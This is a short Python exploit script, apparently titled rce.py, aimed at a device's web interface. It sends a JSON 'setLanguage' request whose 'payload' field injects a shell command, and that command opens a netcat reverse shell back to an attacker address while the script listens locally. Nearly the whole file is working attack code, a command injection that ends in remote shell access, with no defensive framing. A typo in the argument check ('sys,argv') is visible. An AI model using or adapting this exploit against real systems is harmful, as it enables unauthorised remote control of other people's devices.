import requests, urllib3, sys, threading, os 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

port_rev = 5202
reverse_shell = 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f'
netcat_cmd = 'nc -lv %d' % port_rev    #depending on netcat version
if len(sys,argv) < 3:
	print("python3 rce.py <victim_ip> <attacker_ip>")
	exit()

victim = sys.argv[1]
attacker = sys.argv[2]

print("[*] Listening on %d" % port_rev)
t = threading.Thread(target=os.system, args=(netcat_cmd, ))
t.start()


print("[*] Serving payload to %s\n" % victim)
url = "https://" + victim + ":443/"
json = {"method": "setLanguage", "params": {"payload": "';" + reverse_shell % (attacker, port_rev) + ";'"}}
requests.post(url, json=json, verify=False) 